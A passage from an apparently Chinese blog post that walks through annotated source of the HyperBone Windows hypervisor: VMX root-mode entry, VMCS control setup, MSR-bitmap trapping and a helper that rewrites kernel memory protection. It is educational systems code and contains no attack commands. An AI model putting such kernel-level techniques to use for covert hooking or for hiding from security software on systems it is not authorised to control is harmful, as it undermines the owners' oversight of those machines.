包括寄存器的值和程序计数器的值。</span></span><br><span class="line"><span class="comment">        通过将处理器的控制流转移到RtlCaptureContext的返回地址，</span></span><br><span class="line"><span class="comment">        可以在VmxInitializeCPU函数中恢复处理器的状态，继续执行后续的代码逻辑。</span></span><br><span class="line"><span class="comment">        这样做的目的可能是为了在VmxInitializeCPU函数中进行额外的处理或记录虚拟机的初始化状态。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 原子自增操作，意味着有一个虚拟CPU被创建或启动。该函数确保在多线程环境下，对变量进行原子操作，避免了竞争条件。</span></span><br><span class="line">        <span class="built_in">InterlockedIncrement</span>( &amp;g_Data-&gt;vcpus );</span><br><span class="line">        <span class="type">int</span> res = __vmx_vmlaunch();<span class="comment">// 启动虚拟机</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 原子自减操作，表示一个虚拟CPU的执行已经结束或销毁。</span></span><br><span class="line">        <span class="built_in">InterlockedDecrement</span>( &amp;g_Data-&gt;vcpus );</span><br><span class="line">        <span class="comment">/* 这两个函数有c++11新特性atomic，详见文档 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果程序执行到了这里，那么可能存在两种情况：VMCS设置失败，或者启动操作没有按照计划进行。</span></span><br><span class="line"><span class="comment">        无论是哪种情况，由于VmxEnabled没有被设置为1，都代表失败的情况。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        Vcpu-&gt;VmxState = VMX_STATE_OFF;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_vmlaunch failed with result %d\n&quot;</span>, CPU_IDX, __FUNCTION__, res );</span><br><span class="line"></span><br><span class="line">failedvmxoff:</span><br><span class="line">        __vmx_off();<span class="comment">// 关闭VMX</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">failed:;<span class="comment">// 失败处理 释放内存</span></span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMXON)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMXON );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMCS)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMCS );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMMStack)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMMStack );</span><br><span class="line"></span><br><span class="line">    Vcpu-&gt;VMXON    = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMCS     = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMMStack = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="设置保护"><a href="#设置保护" class="headerlink" title="设置保护"></a>设置保护</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Change protection of nonpaged system address</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;size&quot;&gt;Size of region&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;protection&quot;&gt;New protection flags&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line">NTSTATUS <span class="title function_">UtilProtectNonpagedMemory</span><span class="params">( IN PVOID ptr, IN ULONG64 size, IN ULONG protection )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    MDL是Windows内核中的数据结构，Memory Descriptor List（内存描述列表）。</span></span><br><span class="line"><span class="comment">    它用于描述一个或多个连续物理内存页的详细信息。</span></span><br><span class="line"><span class="comment">    在Windows操作系统中，内存管理模块使用MDL来跟踪和管理内存分配、映射和保护。</span></span><br><span class="line"><span class="comment">    MDL通常与虚拟内存映射、物理内存页面和驱动程序之间的交互密切相关。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    MDL的主要字段包括：</span></span><br><span class="line"><span class="comment">        StartVa：指向MDL所描述的内存区域的起始虚拟地址。</span></span><br><span class="line"><span class="comment">        ByteCount：描述MDL涵盖的内存区域的总字节数。</span></span><br><span class="line"><span class="comment">        MappedSystemVa：如果MDL中的内存区域被映射到了系统地址空间，则该字段表示映射后的虚拟地址；否则为NULL。</span></span><br><span class="line"><span class="comment">        Process：指向拥有该MDL的进程对象的指针。</span></span><br><span class="line"><span class="comment">        Flags：用于标识MDL的一些特性，如是否映射到系统地址空间、是否是锁定的等。</span></span><br><span class="line"><span class="comment">    驱动程序可以通过创建和操作MDL来管理内存。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    PMDL pMdl = IoAllocateMdl( ptr, (ULONG)size, FALSE, FALSE, <span class="literal">NULL</span> );<span class="comment">// 创建一个包含给定地址的MDL</span></span><br><span class="line">    <span class="keyword">if</span> (pMdl)</span><br><span class="line">    &#123;</span><br><span class="line">        MmBuildMdlForNonPagedPool( pMdl );<span class="comment">// 将这个MDL描述的物理内存区域与非分页池相关联</span></span><br><span class="line">        pMdl-&gt;MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;<span class="comment">// 该MDL描述的虚拟地址映射到了内核的虚拟地址空间中</span></span><br><span class="line">        status = MmProtectMdlSystemAddress( pMdl, protection );<span class="comment">// 在MDL中描述的物理内存区域的保护属性设置为给定的属性</span></span><br><span class="line">        IoFreeMdl( pMdl );<span class="comment">// 释放MDL</span></span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="启动Vmx-Root模式"><a href="#启动Vmx-Root模式" class="headerlink" title="启动Vmx Root模式"></a>启动Vmx Root模式</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Switch CPU to root mode</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;TRUE on success&lt;/returns&gt;</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">VmxEnterRoot</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 将CPU切换到root模式，虚拟机监视器VMM运行的特权级别最高的模式，用于管理和控制虚拟机的执行</span></span><br><span class="line">    PKSPECIAL_REGISTERS Registers = &amp;Vcpu-&gt;HostState.SpecialRegisters;<span class="comment">// 主机特殊寄存器</span></span><br><span class="line">    PIA32_VMX_BASIC_MSR pBasic = (PIA32_VMX_BASIC_MSR)&amp;Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_BASIC )];<span class="comment">// VMX基本MSR</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查虚拟机控制结构VMCS是否能够适应单个页面</span></span><br><span class="line">    <span class="keyword">if</span> (pBasic-&gt;Fields.RegionSize &gt; PAGE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: VMCS region doesn&#x27;t fit into one page\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查VMCS所需的内存类型是否为写回缓存类型</span></span><br><span class="line">    <span class="keyword">if</span> (pBasic-&gt;Fields.MemoryType != VMX_MEM_TYPE_WRITEBACK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Unsupported memory type\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否支持使用真实MSR获取虚拟化功能信息</span></span><br><span class="line">    <span class="keyword">if</span> (pBasic-&gt;Fields.VmxCapabilityHint == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No true MSR support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存VMXON、VMCS的修订号</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在硬件层面，VMXON指令用于激活处理器的虚拟机扩展（Intel VT-x或AMD-V），这是一种硬件虚拟化技术，</span></span><br><span class="line"><span class="comment">    允许多个虚拟机同时运行，并将它们隔离开来。VMXON指令的执行会初始化虚拟机相关的数据结构，</span></span><br><span class="line"><span class="comment">    并将处理器的运行模式从非虚拟化模式切换到虚拟化模式。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在虚拟化环境中，VMXON指令通常由虚拟机监视器（VMM）或Hypervisor在启动虚拟机时调用。</span></span><br><span class="line"><span class="comment">    它必须在特权级别最高的模式下执行，通常是在操作系统内核中。</span></span><br><span class="line"><span class="comment">    执行VMXON指令后，处理器将转入根模式，VMM可以通过VMCS（虚拟机控制结构）对虚拟机进行管理和控制。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    Vcpu-&gt;VMXON-&gt;RevisionId = pBasic-&gt;Fields.RevisionIdentifier;</span><br><span class="line">    Vcpu-&gt;VMCS-&gt;RevisionId  = pBasic-&gt;Fields.RevisionIdentifier;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据MSR_IA32_VMX_CR0_FIXED0和MSR_IA32_VMX_CR0_FIXED1的要求修正CR0寄存器</span></span><br><span class="line">    Registers-&gt;Cr0 &amp;= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR0_FIXED1 )].LowPart;</span><br><span class="line">    Registers-&gt;Cr0 |= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR0_FIXED0 )].LowPart;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据MSR_IA32_VMX_CR4_FIXED0和MSR_IA32_VMX_CR4_FIXED1的要求修正CR4寄存器</span></span><br><span class="line">    Registers-&gt;Cr4 &amp;= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR4_FIXED1 )].LowPart;</span><br><span class="line">    Registers-&gt;Cr4 |= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR4_FIXED0 )].LowPart;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交r0、r4寄存器的更新</span></span><br><span class="line">    __writecr0( Registers-&gt;Cr0 );</span><br><span class="line">    __writecr4( Registers-&gt;Cr4 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开启VMX root模式</span></span><br><span class="line">    PHYSICAL_ADDRESS phys = <span class="built_in">MmGetPhysicalAddress</span>( Vcpu-&gt;VMXON );</span><br><span class="line">    <span class="type">int</span> res = __vmx_on( (PULONG64)&amp;phys );</span><br><span class="line">    <span class="keyword">if</span> (res)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_on failed with status %d\n&quot;</span>, CPU_IDX, __FUNCTION__, res );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除VMCS, 修改状态为Inactive</span></span><br><span class="line">    phys = <span class="built_in">MmGetPhysicalAddress</span>( Vcpu-&gt;VMCS );</span><br><span class="line">    <span class="keyword">if</span> (__vmx_vmclear( (PULONG64)&amp;phys ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_vmclear failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载VMCS, 设置状态为Active</span></span><br><span class="line">    <span class="keyword">if</span> (__vmx_vmptrld( (PULONG64)&amp;phys ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_vmptrld failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VMX Root模式启动, 以及一个激活的VMCS.</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="设置VMCS字段"><a href="#设置VMCS字段" class="headerlink" title="设置VMCS字段"></a>设置VMCS字段</h5><p><img src="/.io//e29d346719df43fd8b7c9363083f23e6.png" alt="在这里插入图片描述"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Setup VMCS fields</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;VpData&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxSetupVMCS</span><span class="params">( IN PVCPU VpData )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKPROCESSOR_STATE state = &amp;VpData-&gt;HostState;</span><br><span class="line">    VMX_GDTENTRY64 vmxGdtEntry = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_VM_ENTER_CONTROLS vmEnterCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_VM_EXIT_CONTROLS vmExitCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_PIN_BASED_CONTROLS vmPinCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_CPU_BASED_CONTROLS vmCpuCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_SECONDARY_CPU_BASED_CONTROLS vmCpuCtl2Requested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Hypervisor（超级监控程序）是一种虚拟化技术的关键组成部分。</span></span><br><span class="line"><span class="comment">    它是在物理计算机上创建和管理虚拟机（Virtual Machine，VM）的软件或固件。</span></span><br><span class="line"><span class="comment">    Hypervisor 在物理硬件和虚拟机之间充当中间层，允许多个虚拟机同时在同一台物理机上运行，</span></span><br><span class="line"><span class="comment">    并提供虚拟机对硬件资源的访问。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Hypervisor 有两种主要类型：</span></span><br><span class="line"><span class="comment">        直接运行在物理硬件上，它可以直接管理物理资源和虚拟机实例，将物理资源划分给各个虚拟机，</span></span><br><span class="line"><span class="comment">    并在它们之间进行调度和隔离。常见的类型 1 Hypervisor 包括 VMware ESXi、Microsoft Hyper-V 和 Xen。</span></span><br><span class="line"><span class="comment">        作为一个应用程序在操作系统之上运行。它需要一个宿主操作系统提供硬件访问和资源管理功能，</span></span><br><span class="line"><span class="comment">    然后在其上创建和管理虚拟机。常见的类型 2 Hypervisor 包括 Oracle VirtualBox 和 VMware Workstation。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入控制字段，虚拟机在进入hypervisor时确保以x64模式进入</span></span><br><span class="line">    vmEnterCtlRequested.Fields.IA32eModeGuest = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 退出控制字段，虚拟机退出hypervisor时，确保以x64模式退出</span></span><br><span class="line">    vmExitCtlRequested.Fields.AcknowledgeInterruptOnExit = TRUE;</span><br><span class="line">    vmExitCtlRequested.Fields.HostAddressSpaceSize = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 虚拟机CPU控制字段，启用MSR位图，激活次级控制和CR3退出，在CR3改变时无效VPID缓存</span></span><br><span class="line">    vmCpuCtlRequested.Fields.UseMSRBitmaps = TRUE;</span><br><span class="line">    vmCpuCtlRequested.Fields.ActivateSecondaryControl = TRUE;</span><br><span class="line">    <span class="comment">//vmCpuCtlRequested.Fields.UseTSCOffseting = TRUE;</span></span><br><span class="line">    <span class="comment">//vmCpuCtlRequested.Fields.RDTSCExiting = TRUE;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// VPID caches must be invalidated on CR3 change</span></span><br><span class="line">    <span class="keyword">if</span>(g_Data-&gt;Features.VPID)</span><br><span class="line">        vmCpuCtlRequested.Fields.CR3LoadExiting = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在虚拟机中启用对于 RDTSCP 和 XSAVES/XRESTORES 指令的支持。</span></span><br><span class="line"><span class="comment">    在 Windows 10 系统中，如果 CPU 支持这些指令，操作系统会使用它们来提高性能。</span></span><br><span class="line"><span class="comment">    通过使用 VmxpAdjustMsr 函数，如果处理器不支持这些指令，将会忽略对这些选项的设置。</span></span><br><span class="line"><span class="comment">    这样可以确保在不支持这些指令的处理器上仍然可以正常运行虚拟机监控程序，</span></span><br><span class="line"><span class="comment">    而不会因为这些指令的不支持而导致错误。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    vmCpuCtl2Requested.Fields.EnableRDTSCP = TRUE;</span><br><span class="line">    vmCpuCtl2Requested.Fields.EnableXSAVESXSTORS = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Begin by setting the link pointer to the required value for 4KB VMCS.</span></span><br><span class="line">    <span class="comment">// 从设置VMCS的链接指针字段开始，设置为4KB VMCS所需的值</span></span><br><span class="line">    __vmx_vmwrite( VMCS_LINK_POINTER, MAXULONG64 );</span><br><span class="line">    <span class="comment">// 将VMCS需要的各个控制字段写入VMCS</span></span><br><span class="line">    __vmx_vmwrite(</span><br><span class="line">        PIN_BASED_VM_EXEC_CONTROL, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_PINBASED_CTLS )], vmPinCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite( </span><br><span class="line">        CPU_BASED_VM_EXEC_CONTROL, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_PROCBASED_CTLS )], vmCpuCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite( </span><br><span class="line">        SECONDARY_VM_EXEC_CONTROL, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_PROCBASED_CTLS2 )], vmCpuCtl2Requested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite(</span><br><span class="line">        VM_EXIT_CONTROLS, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_EXIT_CTLS )], vmExitCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite( </span><br><span class="line">        VM_ENTRY_CONTROLS, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_ENTRY_CTLS )], vmEnterCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载MSR位图</span></span><br><span class="line">    PUCHAR bitMapReadLow = g_Data-&gt;MSRBitmap;       <span class="comment">// 0x00000000 - 0x00001FFF</span></span><br><span class="line">    PUCHAR bitMapReadHigh = bitMapReadLow + <span class="number">1024</span>;   <span class="comment">// 0xC0000000 - 0xC0001FFF</span></span><br><span class="line"></span><br><span class="line">    RTL_BITMAP bitMapReadLowHeader = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    RTL_BITMAP bitMapReadHighHeader = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitializeBitMap</span>( &amp;bitMapReadLowHeader, (PULONG)bitMapReadLow, <span class="number">1024</span> * <span class="number">8</span> );</span><br><span class="line">    <span class="built_in">RtlInitializeBitMap</span>( &amp;bitMapReadHighHeader, (PULONG)bitMapReadHigh, <span class="number">1024</span> * <span class="number">8</span> );</span><br><span class="line">    <span class="comment">// 设置需要捕获的MSR</span></span><br><span class="line">    <span class="built_in">RtlSetBit</span>( &amp;bitMapReadLowHeader, MSR_IA32_FEATURE_CONTROL );    <span class="comment">// MSR_IA32_FEATURE_CONTROL</span></span><br><span class="line">    <span class="built_in">RtlSetBit</span>( &amp;bitMapReadLowHeader,  MSR_IA32_DEBUGCTL 